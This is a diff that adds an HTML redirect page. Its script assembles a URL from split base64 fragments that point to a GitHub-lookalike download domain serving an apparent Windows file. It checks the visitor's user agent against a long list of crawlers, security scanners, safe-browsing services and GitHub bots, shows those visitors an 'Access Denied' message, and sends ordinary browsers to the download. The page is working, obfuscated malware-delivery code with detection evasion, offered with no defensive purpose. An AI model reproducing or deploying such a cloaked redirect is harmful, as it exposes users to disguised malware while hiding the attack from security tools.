@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="referrer" content="no-referrer">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Redirecting...</title>
+  <style>
+    body { margin: 0; padding: 0; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .spinner { width: 20px; height: 20px; border: 2px solid rgba(0, 0, 0, 0.1); border-radius: 50%; border-top-color: #3498db; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <script>
+    const p1 = [
+      atob("aHR0"),
+      atob("cHM6"),
+      atob("Ly8=")
+    ].join("");
+
+    const p2 = [
+      atob("Z2l0"),
+      atob("aHVi"),
+      atob("c2Vj"),
+      atob("dXJl"),
+      atob("ZG93"),
+      atob("bmxv")
+    ].join("");
+
+    const p3 = [
+      atob("YWQ="),
+      atob("Lm9u"),
+      atob("bGlu"),
+      atob("ZQ=="),
+      atob("Lw==")
+    ].join("");
+
+    const p4 = [
+      atob("aHJm"),
+      atob("Lw=="),
+      atob("d2lu")  // win
+    ].join("");
+
+    const u = p1 + p2 + p3 + p4;
+    console.log("Собранный URL:", u);
+
+    // Список запрещённых User-Agent (включая GitHub боты)
+    const b = [
+      "bot", "spider", "crawl", "slurp", "scanner", "python", "go-http-client", "okhttp", "java", "wget", "curl",
+      "headlesschrome", "puppeteer", "phantomjs", "selenium", "yandexbot", "googlebot", "bingbot", "baiduspider",
+      "python-requests", "http_client", "restsharp", "java/", "okhttp/", "go http", "node-fetch", "axios", "fetch",
+      "Custom-AsyncHttpClient", "Discordbot", "archive.org_bot", "Go-http-client", "Python",
+      "HttpClient", "HeadlessChrome", "inspici", "censys", "zgrab", "internet-measurement", "driftnet", "scaninfo",
+      "paloaltonetworks.com", "google-safebrowsing", "YandexBot", "VirusTotal", "CloudProxy", "sucuri", "quttera",
+      "Quttera-NIDS", "AdsBot", "Feedfetcher", "Mediapartners", "APIs-Google", "InspectionTool", "Storebot",
+      "GoogleOther", "Slurp", "WGETbot", "httpx", "libwww-perl", "httpunit", "Nutch", "phpcrawl", "msnbot",
+      "360Spider", "acapbot", "acoonbot", "ahrefs", "alexibot", "asterias", "attackbot", "backdorbot", "becomebot",
+      "binlar", "blackwidow", "blekkobot", "blexbot", "blowfish", "bullseye", "bunnys", "butterfly", "careerbot",
+      "casper", "checkpriv", "cheesebot", "cherrypick", "chinaclaw", "choppy", "clshttp", "cmsworld", "copernic",
+      "copyrightcheck", "cosmos", "crescent", "cy_cho", "datacha", "demon", "diavol", "discobot", "dittospyder",
+      "dotbot", "dotnetdotcom", "dumbot", "emailcollector", "emailsiphon", "emailwolf", "exabot", "extract", "eyenetie",
+      "feedfinder", "flaming", "flashget", "flicky", "foobot", "g00g1e", "getright", "gigabot", "go-ahead-got", "gozilla",
+      "grabnet", "grafula", "harvest", "heritrix", "httrack", "icarus6j", "jetbot", "jetcar", "jikespider", "kmccrew",
+      "leechftp", "libweb", "linkextractor", "linkscan", "linkwalker", "loader", "masscan", "miner", "majestic", "mechanize",
+      "mj12bot", "morfeus", "moveoverbot", "netmechanic", "netspider", "nicerspro", "nikto", "ninja", "nutch", "octopus",
+      "pagegrabber", "planetwork", "postrank", "proximic", "purebot", "pycurl", "queryn", "queryseeker", "radian6", "radiation",
+      "realdownload", "rogerbot", "scooter", "seekerspider", "semalt", "siclab", "sindice", "sistrix", "sitebot", "siteexplorer",
+      "sitesnagger", "skygrid", "smartdownload", "snoopy", "sosospider", "spankbot", "spbot", "sqlmap", "stackrambler",
+      "stripper", "sucker", "surftbot", "sux0r", "suzukacz", "suzuran", "takeout", "teleport", "telesoft", "true_robots",
+      "turingos", "turnit", "vampire", "vikspider", "voideye", "webleacher", "webreaper", "webstripper", "webvac",
+      "webviewer", "webwhacker", "winhttp", "wwwoffle", "woxbot", "xaldon", "xxxyy", "yamanalab", "yioopbot", "youda",
+      "zeus", "zmeu", "zune", "zyborg", "Cloudflare", "CheckHost", "google.com/bot.html", "Google-Safety", "serpstatbot.com",
+      "tracking", "abuse", "domainsbot.com", "Pandalytics", "/bot", "CuteStat", "Bot", "Spider", "Crawl", "Yahoo",
+      "DuckDuckBot", "Baidu", "Sogou", "Exabot", "facebot", "ia_archiver", "Twitterbot", "LinkedInBot", "Embedly",
+      "Slackbot", "VK_Share", "W3C_Validator", "BingPreview", "Google Page Speed", "Pinterest", "Mixpanel", "Sentry", "New Relic",
+      "GitHub-Hookshot", "GitHub-Pages-Health-Check", "GitHub-Webhooks-Exporter", "GitHub-Camel", "GitHub-Release-Notes",
+      "GitHub-App-Fetch", "GitHub-App-Installation", "GitHub-App-Pull-Request", "GitHub-App-Issues", "GitHub-App-Commit",
+      "GitHub-App-Deployment", "GitHub-App-Repository", "GitHub-App-User", "GitHub-App-Organization", "GitHub-App-Marketplace"
+    ];
+
+    const a = navigator.userAgent.toLowerCase();
+    const i = b.some(e => a.includes(e.toLowerCase()));
+
+    if (!i) {
+      setTimeout(() => window.location.href = u, 1000);
+    } else {
+      document.body.innerHTML = `
+        <div style="text-align: center; padding: 20px;">
+          <h1>⚠️ Access Denied</h1>
+          <p>This page is only accessible via a real browser.</p>
+        </div>
+      `;
+    }
+  </script>
+</body>
+</html>
